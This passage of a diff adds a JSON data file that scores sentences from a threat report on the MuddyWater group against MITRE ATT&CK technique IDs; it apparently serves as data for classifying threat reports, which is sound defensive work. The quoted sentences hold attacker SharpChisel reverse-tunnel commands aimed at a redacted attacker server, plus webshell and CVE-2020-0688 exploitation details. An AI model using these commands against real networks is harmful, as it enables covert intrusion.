+        "sentence": "This actually creates a tunnel within a tunnel.",
+        "score": 0.4052
+      },
+      {
+        "sentence": "Given that, it is most likely the operator initiated SOCKS traffic to the server over port 8888, tunneling traffic from applications of interest to inner parts of the network.",
+        "score": 0.4882
+      },
+      {
+        "sentence": "The usage of Chisel and other tunneling tools effectively enable the threat actor to connect to machines within target environments as if they were inside the operator LAN.",
+        "score": 0.4232
+      },
+      {
+        "sentence": "Exchange Exploitation When tracking MuddyWater activity, we came across an interesting subset of activity targeting Exchange servers of high-profile organizations.",
+        "score": 0.4505
+      },
+      {
+        "sentence": "This subset of Exchange exploitation activity is rather interesting, as without context it would be difficult to attribute it to MuddyWater because the activity relies almost completely on publicly available offensive security tools.",
+        "score": 0.408
+      },
+      {
+        "sentence": "The attackers attempt to exploit Exchange servers using two different tools: - A publicly available script for exploiting CVE-2020-0688 () - Ruler – an open source Exchange exploitation framework CVE-2020-0688 Exploitation Analysis of the activity observed suggests the MuddyWater threat group attempted to exploit CVE-2020-0688 on governmental organizations in the Middle East.",
+        "score": 0.4234
+      },
+      {
+        "sentence": "The specific exploit MuddyWater operators were attempting to run was utilized to drop a webshell.",
+        "score": 0.6596
+      },
+      {
+        "sentence": "The attempted webshell drop was performed using a set of PowerShell commands that write the webshell content into a specific path “/ecp/HybridLogout.aspx “.",
+        "score": 0.6352
+      },
+      {
+        "sentence": "The webshell awaits the parameter “cmd ” and runs the commands in it utilizing XSL Script Processing ().",
+        "score": 0.6133
+      },
+      {
+        "sentence": "This activity is highly correlated with a CVE-2020-0688 exploitation script from a Github repository named fuckchina_v2.py.",
+        "score": 0.4719
+      },
+      {
+        "sentence": "The script utilizes CVE-2020-0688 to upload an ASPX webshell to the path : “/ecp/HybridLogout.aspx ” ().",
+        "score": 0.6353
+      },
+      {
+        "sentence": "It is also one of the only publicly available CVE-2020-0688 implementations that drop a web shell.",
+        "score": 0.7452
+      },
+      {
+        "sentence": "Ruler Exploitation Among other activities performed by the threat actors was attempted Ruler exploitation.",
+        "score": 0.4587
+      },
+      {
+        "sentence": "The instance identified targeted a telecommunication company in the Middle East.",
+        "score": 0.3402
+      },
+      {
+        "sentence": "The observed activity suggests the threat actor attempted to create malicious forms, which is one of the most common usages of Ruler ().",
+        "score": 0.5459
+      },
+      {
+        "sentence": "Usage of Ruler was previously associated with other Iranian threat actors, most commonly with APT33.",
+        "score": 0.4313
+      },
+      {
+        "sentence": "Summary Analysis of MuddyWater activity suggests the group continues to evolve and adapt their techniques.",
+        "score": 0.4494
+      },
+      {
+        "sentence": "While still relying on publicly available offensive security tools, the group has been refining its custom toolset and utilizing new techniques to avoid detection.",
+        "score": 0.3596
+      },
+      {
+        "sentence": "This is observed through the three distinct activities observed and analyzed in this report: The evolution of the PowGoop malware family, the usage of tunneling tools, and the targeting of Exchange servers in high-profile organizations.",
+        "score": 0.4302
+      },
+      {
+        "sentence": "Like many other Iranian threat actors, the group displays less sophistication and technological complexity compared to other state-sponsored APT groups.",
+        "score": 0.4248
+      },
+      {
+        "sentence": "Even so, it appears MuddyWater’s persistency is a key to their success, and their lack of sophistication does not appear to prevent them from achieving their goals.",
+        "score": 0.3727
+      }
+    ],
+    "T1572": [
+      {
+        "sentence": "Overview MuddyWater is commonly considered an Iranian state-sponsored threat actor but no further granularity has previously been available.",
+        "score": 0.3577
+      },
+      {
+        "sentence": "As of January 12th, 2022, U.S.",
+        "score": 0.3258
+      },
+      {
+        "sentence": "CyberCommand has attributed this activity to the Iranian Ministry of Intelligence (MOIS).",
+        "score": 0.3666
+      },
+      {
+        "sentence": "While some cases allow for attribution hunches, or even fleshed out connections to handles and online personas, attribution to a particular government organization is often reserved to the kind of visibility only available to governments with a well-developed all-source and signals intelligence apparatus.",
+        "score": 0.421
+      },
+      {
+        "sentence": "As in all cases of public government attribution, we take this as an opportunity to reassess our assumptions about a given threat actor all the while recognizing that we can’t independently verify the basis for this claim.",
+        "score": 0.3649
+      },
+      {
+        "sentence": "Cyber Command pointed to multiple malware sets used by MuddyWater.",
+        "score": 0.3062
+      },
+      {
+        "sentence": "Among those, PowGoop correlates with activities we’ve triaged in recent incidents.",
+        "score": 0.3268
+      },
+      {
+        "sentence": "We hope sharing relevant in-the-wild findings will further bolster our collective defense against this threat.",
+        "score": 0.3347
+      },
+      {
+        "sentence": "Attributed through @NCIJTF @FBI — USCYBERCOM Cybersecurity Alert (@CNMF_CyberAlert) January 12, 2022 Analysis of New PowGoop Variants PowGoop is a malware family first described by Palo Alto which utilizes DLL search order hijacking ().",
+        "score": 0.3343
+      },
+      {
+        "sentence": "The name derives from the usage ‘GoogleUpdate.exe ‘ to load a malicious modified version of ‘goopdate.dll ‘, which is used to load a malicious PowerShell script from an external file.",
+        "score": 0.3539
+      },
+      {
+        "sentence": "Other variants were described by ClearSkySec and Symantec.",
+        "score": 0.3715
+      },
+      {
+        "sentence": "We identified newer variants of PowGoop loader that involve significant changes, suggesting the group continues to use and maintain it even after recent exposures.",
+        "score": 0.3559
+      },
+      {
+        "sentence": "The hijacked DLL contains imports originating from its renamed counterpart, as well as two additional functions written by the attackers.",
+        "score": 0.3604
+      },
+      {
+        "sentence": "Those two ‘.dat ’ files are identical for each of the hijacked DLLs and are both executed using rundll32 on their respective export, which reads the file from disk to a virtually allocated buffer, followed by a call to offset 0 in the read data.",
+        "score": 0.3679
+      },
+      {
+        "sentence": "The overlap in functionality between the two components is not clear; however, it is evident that ‘Core.dat ’ represents a more mature and evolved version of PowGoop as it is loaded as a shellcode, making it less likely to be detected statically.",
+        "score": 0.4717
+      },
+      {
+        "sentence": "It is also worth noting that it is not necessary for both components to reside on the infected system as the malware will execute successfully with either one.",
+        "score": 0.3009
+      },
+      {
+        "sentence": "The PowerShell payloads within ‘config.txt ’ could not be retrieved at the time of writing.",
+        "score": 0.4165
+      },
+      {
+        "sentence": "MuddyWater Tunneling Activity The operators behind MuddyWater activities are very fond of tunneling tools, as described in several recent blog posts().",
+        "score": 0.6661
+      },
+      {
+        "sentence": "The custom tools used by the group often provide limited functionality, and are used to drop tunneling tools which enable the operators to conduct a wider set of activities.",
+        "score": 0.6455
+      },
+      {
+        "sentence": "Among the tunneling tools MuddyWater attackers were observed using are Chisel, SSF and Ligolo.",
+        "score": 0.6633
+      },
+      {
+        "sentence": "The nature of tunneling activities is often confusing.",
+        "score": 0.7389
+      },
+      {
+        "sentence": "However, analysis of Chisel executions by MuddyWater operators on some of the victims helps clarify their usage of such tools.",
+        "score": 0.3959
+      },
+      {
+        "sentence": "This is an example of a command executed by the attackers on some of the victims: SharpChisel.exe client xx.xx.xx.xx:8080 r:8888:127.0.0.1:9999 The “r ” flag used in the client execution implies the server is running in “reverse” mode.",
+        "score": 0.4431
+      },
+      {
+        "sentence": "Setting the --reverse flag, according to Chisel documentation, “allows clients to specify reverse port forwarding remotes in addition to normal remotes”.",
+        "score": 0.547
+      },
+      {
+        "sentence": "In this case, the “SharpChisel.exe ” client runs on the victim machine, connects back to the Chisel server over port 8080, and specifies to forward anything coming over port 8888 of the server to port 9999 of the client.",
+        "score": 0.6155
+      },
+      {
+        "sentence": "This might look odd at first sight as port 9999 is not normally used on Windows machines and is not bound to any specific service.",
+        "score": 0.5275
+      },
+      {
+        "sentence": "This is clarified shortly afterwards as the reverse tunnel is followed by setting up a Chisel SOCKS5 server on the victim, waiting for incoming connections over port 9999: SharpChisel.exe server -p 9999 --socks5 By setting up both a server and a client instance of Chisel on the machine, the operators enable themselves to tunnel a variety of protocols which are supported over SOCKS5.",
+        "score": 0.7256
+      },
+      {
+        "sentence": "This actually creates a tunnel within a tunnel.",
+        "score": 0.6216
+      },
+      {
+        "sentence": "Given that, it is most likely the operator initiated SOCKS traffic to the server over port 8888, tunneling traffic from applications of interest to inner parts of the network.",
+        "score": 0.7413
+      },
+      {
+        "sentence": "The usage of Chisel and other tunneling tools effectively enable the threat actor to connect to machines within target environments as if they were inside the operator LAN.",
+        "score": 0.6953
+      },
+      {
+        "sentence": "Exchange Exploitation When tracking MuddyWater activity, we came across an interesting subset of activity targeting Exchange servers of high-profile organizations.",
+        "score": 0.4358
+      },
+      {
+        "sentence": "This subset of Exchange exploitation activity is rather interesting, as without context it would be difficult to attribute it to MuddyWater because the activity relies almost completely on publicly available offensive security tools.",
+        "score": 0.3909
+      },
+      {
+        "sentence": "The attackers attempt to exploit Exchange servers using two different tools: - A publicly available script for exploiting CVE-2020-0688 () - Ruler – an open source Exchange exploitation framework CVE-2020-0688 Exploitation Analysis of the activity observed suggests the MuddyWater threat group attempted to exploit CVE-2020-0688 on governmental organizations in the Middle East.",
+        "score": 0.3504
+      },
+      {
+        "sentence": "The specific exploit MuddyWater operators were attempting to run was utilized to drop a webshell.",
+        "score": 0.3284
+      },
+      {
+        "sentence": "The attempted webshell drop was performed using a set of PowerShell commands that write the webshell content into a specific path “/ecp/HybridLogout.aspx “.",
+        "score": 0.3705
+      },
+      {
+        "sentence": "The webshell awaits the parameter “cmd ” and runs the commands in it utilizing XSL Script Processing ().",
+        "score": 0.3488
+      },
+      {
+        "sentence": "This activity is highly correlated with a CVE-2020-0688 exploitation script from a Github repository named fuckchina_v2.py.",
+        "score": 0.3659
+      },
+      {
+        "sentence": "It is also one of the only publicly available CVE-2020-0688 implementations that drop a web shell.",
+        "score": 0.3282
+      },
+      {
+        "sentence": "Ruler Exploitation Among other activities performed by the threat actors was attempted Ruler exploitation.",
+        "score": 0.38
+      },
+      {
+        "sentence": "The instance identified targeted a telecommunication company in the Middle East.",
+        "score": 0.4251
+      },
+      {
+        "sentence": "The observed activity suggests the threat actor attempted to create malicious forms, which is one of the most common usages of Ruler ().",
+        "score": 0.3255
+      },
+      {
+        "sentence": "Usage of Ruler was previously associated with other Iranian threat actors, most commonly with APT33.",
+        "score": 0.3766
+      },
+      {
+        "sentence": "Summary Analysis of MuddyWater activity suggests the group continues to evolve and adapt their techniques.",
+        "score": 0.4173
+      },
+      {
+        "sentence": "While still relying on publicly available offensive security tools, the group has been refining its custom toolset and utilizing new techniques to avoid detection.",
+        "score": 0.347
+      },
+      {
+        "sentence": "This is observed through the three distinct activities observed and analyzed in this report: The evolution of the PowGoop malware family, the usage of tunneling tools, and the targeting of Exchange servers in high-profile organizations.",
+        "score": 0.6217
+      },
+      {
+        "sentence": "Like many other Iranian threat actors, the group displays less sophistication and technological complexity compared to other state-sponsored APT groups.",
+        "score": 0.4124
+      },
+      {
+        "sentence": "Even so, it appears MuddyWater’s persistency is a key to their success, and their lack of sophistication does not appear to prevent them from achieving their goals.",
+        "score": 0.3028
+      }
+    ],
+    "T1574.001": [
+      {
+        "sentence": "Overview MuddyWater is commonly considered an Iranian state-sponsored threat actor but no further granularity has previously been available.",
+        "score": 0.3415
+      },
+      {
+        "sentence": "While some cases allow for attribution hunches, or even fleshed out connections to handles and online personas, attribution to a particular government organization is often reserved to the kind of visibility only available to governments with a well-developed all-source and signals intelligence apparatus.",
+        "score": 0.3172
+      },
+      {
+        "sentence": "As in all cases of public government attribution, we take this as an opportunity to reassess our assumptions about a given threat actor all the while recognizing that we can’t independently verify the basis for this claim.",
+        "score": 0.4069
+      },
+      {
+        "sentence": "Cyber Command pointed to multiple malware sets used by MuddyWater.",
+        "score": 0.4158
+      },
+      {
+        "sentence": "Among those, PowGoop correlates with activities we’ve triaged in recent incidents.",
+        "score": 0.3155
+      },
+      {
+        "sentence": "We hope sharing relevant in-the-wild findings will further bolster our collective defense against this threat.",
+        "score": 0.3845
+      },
+      {
+        "sentence": "Iranian MOIS hacker group #MuddyWater is using a suite of malware to conduct espionage and malicious activity.",
+        "score": 0.4134
+      },
+      {
+        "sentence": "If you see two or more of these malware on your network, you may have MuddyWater on it: https://t.co/xTI6xuQOg3.",
+        "score": 0.3834
+      },
+      {
+        "sentence": "Attributed through @NCIJTF @FBI — USCYBERCOM Cybersecurity Alert (@CNMF_CyberAlert) January 12, 2022 Analysis of New PowGoop Variants PowGoop is a malware family first described by Palo Alto which utilizes DLL search order hijacking ().",
+        "score": 0.5978
+      },
+      {
+        "sentence": "The name derives from the usage ‘GoogleUpdate.exe ‘ to load a malicious modified version of ‘goopdate.dll ‘, which is used to load a malicious PowerShell script from an external file.",
+        "score": 0.5868
+      },
+      {
+        "sentence": "Other variants were described by ClearSkySec and Symantec.",
+        "score": 0.3748
+      },
+      {
+        "sentence": "We identified newer variants of PowGoop loader that involve significant changes, suggesting the group continues to use and maintain it even after recent exposures.",
+        "score": 0.5946
+      },
+      {
+        "sentence": "The new variants reveal that the threat group has expanded its arsenal of legitimate software used to load malicious DLLs.",
+        "score": 0.7527
+      },
+      {
+        "sentence": "Aside from ‘GoogleUpdate.exe ’, three additional benign pieces of software are abused in order to sideload malicious DLLs: ‘Git.exe ’, ‘FileSyncConfig.exe ’ and ‘Inno_Updater.exe ’.",
+        "score": 0.7824
+      },
+      {
+        "sentence": "Each contains a modified DLL and a renamed authentic DLL.",
+        "score": 0.5748
+      },
+      {
+        "sentence": "The hijacked DLL contains imports originating from its renamed counterpart, as well as two additional functions written by the attackers.",
+        "score": 0.5576
+      },
+      {
+        "sentence": "Those two ‘.dat ’ files are identical for each of the hijacked DLLs and are both executed using rundll32 on their respective export, which reads the file from disk to a virtually allocated buffer, followed by a call to offset 0 in the read data.",
+        "score": 0.4365
+      },
+      {
+        "sentence": "The overlap in functionality between the two components is not clear; however, it is evident that ‘Core.dat ’ represents a more mature and evolved version of PowGoop as it is loaded as a shellcode, making it less likely to be detected statically.",
+        "score": 0.5264
+      },
+      {
+        "sentence": "It is also worth noting that it is not necessary for both components to reside on the infected system as the malware will execute successfully with either one.",
+        "score": 0.4349
+      },
+      {
+        "sentence": "Given that, it is possible that one or the other could be used as a backup component.",
+        "score": 0.3387
+      },
+      {
+        "sentence": "The PowerShell payloads within ‘config.txt ’ could not be retrieved at the time of writing.",
+        "score": 0.3373
+      },
+      {
+        "sentence": "MuddyWater Tunneling Activity The operators behind MuddyWater activities are very fond of tunneling tools, as described in several recent blog posts().",
+        "score": 0.3439
+      },
+      {
+        "sentence": "The custom tools used by the group often provide limited functionality, and are used to drop tunneling tools which enable the operators to conduct a wider set of activities.",
+        "score": 0.319
+      },
+      {
+        "sentence": "However, analysis of Chisel executions by MuddyWater operators on some of the victims helps clarify their usage of such tools.",
+        "score": 0.4151
+      },
+      {
+        "sentence": "Exchange Exploitation When tracking MuddyWater activity, we came across an interesting subset of activity targeting Exchange servers of high-profile organizations.",
+        "score": 0.3278
+      },
+      {
+        "sentence": "The attackers attempt to exploit Exchange servers using two different tools: - A publicly available script for exploiting CVE-2020-0688 () - Ruler – an open source Exchange exploitation framework CVE-2020-0688 Exploitation Analysis of the activity observed suggests the MuddyWater threat group attempted to exploit CVE-2020-0688 on governmental organizations in the Middle East.",
+        "score": 0.3188
+      },
+      {
+        "sentence": "The specific exploit MuddyWater operators were attempting to run was utilized to drop a webshell.",
+        "score": 0.402
+      },
+      {
+        "sentence": "The attempted webshell drop was performed using a set of PowerShell commands that write the webshell content into a specific path “/ecp/HybridLogout.aspx “.",
+        "score": 0.3552
+      },
+      {
+        "sentence": "This activity is highly correlated with a CVE-2020-0688 exploitation script from a Github repository named fuckchina_v2.py.",
+        "score": 0.3936
+      },
+      {
+        "sentence": "It is also one of the only publicly available CVE-2020-0688 implementations that drop a web shell.",
+        "score": 0.3473
+      },
+      {
+        "sentence": "Ruler Exploitation Among other activities performed by the threat actors was attempted Ruler exploitation.",
+        "score": 0.4186
+      },
+      {
+        "sentence": "The observed activity suggests the threat actor attempted to create malicious forms, which is one of the most common usages of Ruler ().",
+        "score": 0.3476
+      },
+      {
+        "sentence": "Usage of Ruler was previously associated with other Iranian threat actors, most commonly with APT33.",
+        "score": 0.3692
+      },
+      {
+        "sentence": "Summary Analysis of MuddyWater activity suggests the group continues to evolve and adapt their techniques.",
+        "score": 0.44
+      },
+      {
+        "sentence": "Like many other Iranian threat actors, the group displays less sophistication and technological complexity compared to other state-sponsored APT groups.",
+        "score": 0.3566
+      },
+      {
+        "sentence": "Even so, it appears MuddyWater’s persistency is a key to their success, and their lack of sophistication does not appear to prevent them from achieving their goals.",
+        "score": 0.3466
+      }
+    ],
+    "T1059.001": [
+      {
+        "sentence": "While some cases allow for attribution hunches, or even fleshed out connections to handles and online personas, attribution to a particular government organization is often reserved to the kind of visibility only available to governments with a well-developed all-source and signals intelligence apparatus.",
+        "score": 0.3616
+      },
+      {
+        "sentence": "As in all cases of public government attribution, we take this as an opportunity to reassess our assumptions about a given threat actor all the while recognizing that we can’t independently verify the basis for this claim.",
+        "score": 0.3145
+      },
+      {
+        "sentence": "Cyber Command pointed to multiple malware sets used by MuddyWater.",
+        "score": 0.3827
+      },
+      {
+        "sentence": "Among those, PowGoop correlates with activities we’ve triaged in recent incidents.",
+        "score": 0.3263
+      },
+      {
+        "sentence": "We hope sharing relevant in-the-wild findings will further bolster our collective defense against this threat.",
+        "score": 0.3816
+      },
+      {
+        "sentence": "Iranian MOIS hacker group #MuddyWater is using a suite of malware to conduct espionage and malicious activity.",
+        "score": 0.3229
+      },
+      {
+        "sentence": "If you see two or more of these malware on your network, you may have MuddyWater on it: https://t.co/xTI6xuQOg3.",
+        "score": 0.406
+      },
+      {
+        "sentence": "The name derives from the usage ‘GoogleUpdate.exe ‘ to load a malicious modified version of ‘goopdate.dll ‘, which is used to load a malicious PowerShell script from an external file.",
+        "score": 0.6625
+      },
+      {
+        "sentence": "Other variants were described by ClearSkySec and Symantec.",
+        "score": 0.3396
+      },
+      {
+        "sentence": "We identified newer variants of PowGoop loader that involve significant changes, suggesting the group continues to use and maintain it even after recent exposures.",
+        "score": 0.4104
+      },
+      {
+        "sentence": "Aside from ‘GoogleUpdate.exe ’, three additional benign pieces of software are abused in order to sideload malicious DLLs: ‘Git.exe ’, ‘FileSyncConfig.exe ’ and ‘Inno_Updater.exe ’.",
+        "score": 0.3207
+      },
+      {
+        "sentence": "The hijacked DLL contains imports originating from its renamed counterpart, as well as two additional functions written by the attackers.",
+        "score": 0.3386
+      },
+      {
+        "sentence": "Those two ‘.dat ’ files are identical for each of the hijacked DLLs and are both executed using rundll32 on their respective export, which reads the file from disk to a virtually allocated buffer, followed by a call to offset 0 in the read data.",
+        "score": 0.4722
+      },
+      {
+        "sentence": "Both ‘Dore.dat ’ and ‘Core.dat ’ search for a file named ‘config.txt’ and run it using PowerShell in a fashion similar to older versions ( ).",
+        "score": 0.5517
+      },
+      {
+        "sentence": "The overlap in functionality between the two components is not clear; however, it is evident that ‘Core.dat ’ represents a more mature and evolved version of PowGoop as it is loaded as a shellcode, making it less likely to be detected statically.",
+        "score": 0.4856
+      },
+      {
+        "sentence": "It is also worth noting that it is not necessary for both components to reside on the infected system as the malware will execute successfully with either one.",
+        "score": 0.4247
+      },
+      {
+        "sentence": "The PowerShell payloads within ‘config.txt ’ could not be retrieved at the time of writing.",
+        "score": 0.5966
+      },
+      {
+        "sentence": "MuddyWater Tunneling Activity The operators behind MuddyWater activities are very fond of tunneling tools, as described in several recent blog posts().",
+        "score": 0.3282
+      },
+      {
+        "sentence": "The custom tools used by the group often provide limited functionality, and are used to drop tunneling tools which enable the operators to conduct a wider set of activities.",
+        "score": 0.4257
+      },
+      {
+        "sentence": "However, analysis of Chisel executions by MuddyWater operators on some of the victims helps clarify their usage of such tools.",
+        "score": 0.4607
+      },
+      {
+        "sentence": "This is an example of a command executed by the attackers on some of the victims: SharpChisel.exe client xx.xx.xx.xx:8080 r:8888:127.0.0.1:9999 The “r ” flag used in the client execution implies the server is running in “reverse” mode.",
+        "score": 0.5011
+      },
+      {
+        "sentence": "In this case, the “SharpChisel.exe ” client runs on the victim machine, connects back to the Chisel server over port 8080, and specifies to forward anything coming over port 8888 of the server to port 9999 of the client.",
+        "score": 0.363
+      },
+      {
+        "sentence": "This might look odd at first sight as port 9999 is not normally used on Windows machines and is not bound to any specific service.",
+        "score": 0.3512
+      },
+      {
+        "sentence": "This is clarified shortly afterwards as the reverse tunnel is followed by setting up a Chisel SOCKS5 server on the victim, waiting for incoming connections over port 9999: SharpChisel.exe server -p 9999 --socks5 By setting up both a server and a client instance of Chisel on the machine, the operators enable themselves to tunnel a variety of protocols which are supported over SOCKS5.",
+        "score": 0.3107
+      },
+      {
+        "sentence": "This actually creates a tunnel within a tunnel.",
+        "score": 0.3163
+      },
+      {
+        "sentence": "The usage of Chisel and other tunneling tools effectively enable the threat actor to connect to machines within target environments as if they were inside the operator LAN.",
+        "score": 0.3595
+      },
+      {
+        "sentence": "Exchange Exploitation When tracking MuddyWater activity, we came across an interesting subset of activity targeting Exchange servers of high-profile organizations.",
+        "score": 0.3613
+      },
+      {
+        "sentence": "This subset of Exchange exploitation activity is rather interesting, as without context it would be difficult to attribute it to MuddyWater because the activity relies almost completely on publicly available offensive security tools.",
+        "score": 0.4071
+      },
+      {
+        "sentence": "The attackers attempt to exploit Exchange servers using two different tools: - A publicly available script for exploiting CVE-2020-0688 () - Ruler – an open source Exchange exploitation framework CVE-2020-0688 Exploitation Analysis of the activity observed suggests the MuddyWater threat group attempted to exploit CVE-2020-0688 on governmental organizations in the Middle East.",
+        "score": 0.3442
+      },
+      {
+        "sentence": "The specific exploit MuddyWater operators were attempting to run was utilized to drop a webshell.",
+        "score": 0.4404
+      },
+      {
+        "sentence": "The attempted webshell drop was performed using a set of PowerShell commands that write the webshell content into a specific path “/ecp/HybridLogout.aspx “.",
+        "score": 0.5585
+      },
+      {
+        "sentence": "The webshell awaits the parameter “cmd ” and runs the commands in it utilizing XSL Script Processing ().",
+        "score": 0.5413
+      },
+      {
+        "sentence": "This activity is highly correlated with a CVE-2020-0688 exploitation script from a Github repository named fuckchina_v2.py.",
+        "score": 0.386
+      },
+      {
+        "sentence": "The script utilizes CVE-2020-0688 to upload an ASPX webshell to the path : “/ecp/HybridLogout.aspx ” ().",
+        "score": 0.3467
+      },
+      {
+        "sentence": "It is also one of the only publicly available CVE-2020-0688 implementations that drop a web shell.",
+        "score": 0.4377
+      },
+      {
+        "sentence": "Ruler Exploitation Among other activities performed by the threat actors was attempted Ruler exploitation.",
+        "score": 0.4195
+      },
+      {
+        "sentence": "The observed activity suggests the threat actor attempted to create malicious forms, which is one of the most common usages of Ruler ().",
+        "score": 0.4433
+      },
+      {
+        "sentence": "Usage of Ruler was previously associated with other Iranian threat actors, most commonly with APT33.",
+        "score": 0.4027
+      },
+      {
+        "sentence": "Summary Analysis of MuddyWater activity suggests the group continues to evolve and adapt their techniques.",
+        "score": 0.3912
+      },
+      {
+        "sentence": "While still relying on publicly available offensive security tools, the group has been refining its custom toolset and utilizing new techniques to avoid detection.",
+        "score": 0.4302
+      },
+      {
+        "sentence": "This is observed through the three distinct activities observed and analyzed in this report: The evolution of the PowGoop malware family, the usage of tunneling tools, and the targeting of Exchange servers in high-profile organizations.",
+        "score": 0.3662
+      },
+      {
+        "sentence": "Like many other Iranian threat actors, the group displays less sophistication and technological complexity compared to other state-sponsored APT groups.",
+        "score": 0.3509
+      },
+      {
+        "sentence": "Even so, it appears MuddyWater’s persistency is a key to their success, and their lack of sophistication does not appear to prevent them from achieving their goals.",
+        "score": 0.3414
+      }
+    ],
+    "T1137.003": [
+      {
+        "sentence": "While some cases allow for attribution hunches, or even fleshed out connections to handles and online personas, attribution to a particular government organization is often reserved to the kind of visibility only available to governments with a well-developed all-source and signals intelligence apparatus.",
+        "score": 0.3526
+      },
+      {
+        "sentence": "Cyber Command pointed to multiple malware sets used by MuddyWater.",
+        "score": 0.3298
+      },
+      {
+        "sentence": "We hope sharing relevant in-the-wild findings will further bolster our collective defense against this threat.",
+        "score": 0.3054
+      },
+      {
+        "sentence": "Iranian MOIS hacker group #MuddyWater is using a suite of malware to conduct espionage and malicious activity.",
+        "score": 0.3639
+      },
+      {
+        "sentence": "If you see two or more of these malware on your network, you may have MuddyWater on it: https://t.co/xTI6xuQOg3.",
+        "score": 0.3022
+      },
+      {
+        "sentence": "Attributed through @NCIJTF @FBI — USCYBERCOM Cybersecurity Alert (@CNMF_CyberAlert) January 12, 2022 Analysis of New PowGoop Variants PowGoop is a malware family first described by Palo Alto which utilizes DLL search order hijacking ().",
+        "score": 0.3733
+      },
+      {
+        "sentence": "The name derives from the usage ‘GoogleUpdate.exe ‘ to load a malicious modified version of ‘goopdate.dll ‘, which is used to load a malicious PowerShell script from an external file.",
+        "score": 0.4249
+      },
+      {
+        "sentence": "Other variants were described by ClearSkySec and Symantec.",
+        "score": 0.3004
+      },
+      {
+        "sentence": "We identified newer variants of PowGoop loader that involve significant changes, suggesting the group continues to use and maintain it even after recent exposures.",
+        "score": 0.3875
+      },
+      {
+        "sentence": "The new variants reveal that the threat group has expanded its arsenal of legitimate software used to load malicious DLLs.",
+        "score": 0.3051
+      },
+      {
+        "sentence": "Aside from ‘GoogleUpdate.exe ’, three additional benign pieces of software are abused in order to sideload malicious DLLs: ‘Git.exe ’, ‘FileSyncConfig.exe ’ and ‘Inno_Updater.exe ’.",
+        "score": 0.3084
+      },
+      {
+        "sentence": "Those two ‘.dat ’ files are identical for each of the hijacked DLLs and are both executed using rundll32 on their respective export, which reads the file from disk to a virtually allocated buffer, followed by a call to offset 0 in the read data.",
+        "score": 0.3124
+      },
+      {
+        "sentence": "Both ‘Dore.dat ’ and ‘Core.dat ’ search for a file named ‘config.txt’ and run it using PowerShell in a fashion similar to older versions ( ).",
+        "score": 0.3395
+      },
+      {
+        "sentence": "The overlap in functionality between the two components is not clear; however, it is evident that ‘Core.dat ’ represents a more mature and evolved version of PowGoop as it is loaded as a shellcode, making it less likely to be detected statically.",
+        "score": 0.4322
+      },
+      {
+        "sentence": "The PowerShell payloads within ‘config.txt ’ could not be retrieved at the time of writing.",
+        "score": 0.3483
+      },
+      {
+        "sentence": "Exchange Exploitation When tracking MuddyWater activity, we came across an interesting subset of activity targeting Exchange servers of high-profile organizations.",
+        "score": 0.4213
+      },
+      {
+        "sentence": "This subset of Exchange exploitation activity is rather interesting, as without context it would be difficult to attribute it to MuddyWater because the activity relies almost completely on publicly available offensive security tools.",
+        "score": 0.3809
+      },
+      {
+        "sentence": "The attackers attempt to exploit Exchange servers using two different tools: - A publicly available script for exploiting CVE-2020-0688 () - Ruler – an open source Exchange exploitation framework CVE-2020-0688 Exploitation Analysis of the activity observed suggests the MuddyWater threat group attempted to exploit CVE-2020-0688 on governmental organizations in the Middle East.",
+        "score": 0.3968
+      },
+      {
+        "sentence": "The specific exploit MuddyWater operators were attempting to run was utilized to drop a webshell.",
+        "score": 0.3236
+      },
+      {
+        "sentence": "The attempted webshell drop was performed using a set of PowerShell commands that write the webshell content into a specific path “/ecp/HybridLogout.aspx “.",
+        "score": 0.4032
+      },
+      {
+        "sentence": "The webshell awaits the parameter “cmd ” and runs the commands in it utilizing XSL Script Processing ().",
+        "score": 0.3641
+      },
+      {
+        "sentence": "This activity is highly correlated with a CVE-2020-0688 exploitation script from a Github repository named fuckchina_v2.py.",
+        "score": 0.3308
+      },
+      {
+        "sentence": "The script utilizes CVE-2020-0688 to upload an ASPX webshell to the path : “/ecp/HybridLogout.aspx ” ().",
+        "score": 0.3344
+      },
+      {
+        "sentence": "It is also one of the only publicly available CVE-2020-0688 implementations that drop a web shell.",
+        "score": 0.3339
+      },
+      {
+        "sentence": "Ruler Exploitation Among other activities performed by the threat actors was attempted Ruler exploitation.",
+        "score": 0.3975
+      },
+      {
+        "sentence": "The observed activity suggests the threat actor attempted to create malicious forms, which is one of the most common usages of Ruler ().",
+        "score": 0.705
+      },
+      {
+        "sentence": "Usage of Ruler was previously associated with other Iranian threat actors, most commonly with APT33.",
+        "score": 0.3293
+      },
+      {
+        "sentence": "Summary Analysis of MuddyWater activity suggests the group continues to evolve and adapt their techniques.",
+        "score": 0.3829
+      },
+      {
+        "sentence": "This is observed through the three distinct activities observed and analyzed in this report: The evolution of the PowGoop malware family, the usage of tunneling tools, and the targeting of Exchange servers in high-profile organizations.",
+        "score": 0.3197
+      },
+      {
+        "sentence": "Like many other Iranian threat actors, the group displays less sophistication and technological complexity compared to other state-sponsored APT groups.",
+        "score": 0.3197
+      },
+      {
+        "sentence": "Even so, it appears MuddyWater’s persistency is a key to their success, and their lack of sophistication does not appear to prevent them from achieving their goals.",
+        "score": 0.3119
+      }
+    ]
+  }
+}
